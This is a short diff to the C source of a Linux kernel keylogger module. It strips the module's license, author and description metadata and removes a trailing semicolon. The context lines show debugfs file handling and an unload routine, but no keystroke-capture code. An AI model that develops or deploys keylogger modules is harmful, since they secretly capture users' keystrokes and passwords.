@@ -1,9 +1,5 @@
 #include "keylogger.h"
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("8xbit");
-MODULE_VERSION("1.0");
-MODULE_DESCRIPTION("Just a simple keylogger");
-MODULE_SUPPORTED_DEVICE("Not machine dependent");
+
 /*vars for makeing files*/
 static struct dentry *file;
 static struct dentry *file1;
@@ -128,5 +124,3 @@ void stop_keylogger(void)
     debugfs_remove_recursive(subdir);
     printk(KERN_ALERT "Keylogger: unload the module");
 } 
-
-;
